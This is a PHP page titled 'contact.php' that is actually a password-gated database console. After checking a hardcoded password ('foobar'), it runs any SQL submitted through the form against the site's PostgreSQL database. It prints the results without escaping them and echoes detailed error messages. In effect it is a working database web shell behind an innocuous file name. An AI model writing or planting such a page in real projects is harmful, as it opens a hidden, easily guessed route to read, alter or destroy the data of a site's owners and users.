<!DOCTYPE html>
<html lang = "en-US">
	<head>
		<meta charset = "UTF-8">
		<title>contact.php</title>
		<style type = "text/css">
			table, th, td {border: 1px solid black};
		</style>
	</head>
	<body>
		<form method="post">
			Pass : <input type="text" name="pass" placeholder="pass">
			<br />
			Command : <input type="text" name="command" placeholder="query">
			<br />
			<input type="submit" name="submit" value="query">
			<input type="submit" name="submit" value="execute">
		</form>
		<p>
			<?php

			function customError($errno, $errstr, $errfile, $errline) {
				echo "<b>Error:</b> [$errno] '$errstr' in '$errfile', line $errline<br />";
			}
			set_error_handler("customError");

			if ($_SERVER["REQUEST_METHOD"] == "POST") {

				if ($_POST["pass"] == "foobar") {
					try {
						$db = parse_url(getenv("DATABASE_URL"));
					
						$con = new PDO("pgsql:" . sprintf(
							"host=%s;port=%s;user=%s;password=%s;dbname=%s",
							$db["host"],
							$db["port"],
							$db["user"],
						$db["pass"],
						ltrim($db["path"], "/")
					));
					
					$con->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
					
					$command = $_POST["command"];

					if ($_POST["submit"] == "query") {
						//first pass just gets the column names
						print "OUTPUT:<br/><table>";
						$result = $con->query($command);
						//return only the first row (we only need field names)
						$row = $result->fetch(PDO::FETCH_ASSOC);
						print_r($row);
						print " <tr>";
						foreach ($row as $field => $value){
							print " <th>$field</th>";
						} // end foreach
						print " </tr>n";
						//second query gets the data
						$data = $con->query($command);
						$data->setFetchMode(PDO::FETCH_ASSOC);
						foreach($data as $row){
							print " <tr>";
							foreach ($row as $name=>$value){
								print " <td>$value</td>";
							} // end field loop
							print " </tr>";
						} // end record loop
						print "</table>";
					} else if ($_POST["submit"] == "execute") {

						echo "OUTPUT<br/>";

						echo (string)($con->exec($command));

					}
				} catch(PDOException $e) {
					echo 'ERROR: ' . $e->getMessage();
				} // end try
				}
			}
			?>
		</p>
	</body>
	</html>